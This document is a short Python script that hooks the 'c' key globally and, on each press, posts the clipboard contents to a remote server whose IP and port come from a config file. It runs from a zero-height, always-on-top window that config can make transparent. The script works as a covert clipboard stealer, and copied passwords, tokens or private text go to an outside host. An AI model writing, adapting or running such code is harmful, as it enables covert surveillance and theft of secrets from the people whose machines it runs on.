from tkinter import Tk, Label, messagebox, LEFT
import keyboard
import requests
import configparser
import sys

def send_data(event):
    bufer_data = root.clipboard_get()
    adress = f'http://{SERVER_IP}:{SERVER_PORT}/'
    requests.post(adress, json={'data': bufer_data})

def main():
    global root, SERVER_IP, SERVER_PORT

    config = configparser.ConfigParser()
    config.read('main_settings.conf')
    SHOW_WINDOW = config['Window']['SHOW_WINDOW']
    SERVER_IP = config['Server']['SERVER_IP']
    SERVER_PORT = config['Server']['SERVER_PORT']

    root = Tk()
    root.title('Main')
    root.geometry('200x0')
    root.wm_attributes('-alpha', float(SHOW_WINDOW))
    root.wm_attributes('-topmost', True)

    keyboard.hook_key('c', send_data)

    root.mainloop()

if __name__ == '__main__':
    main()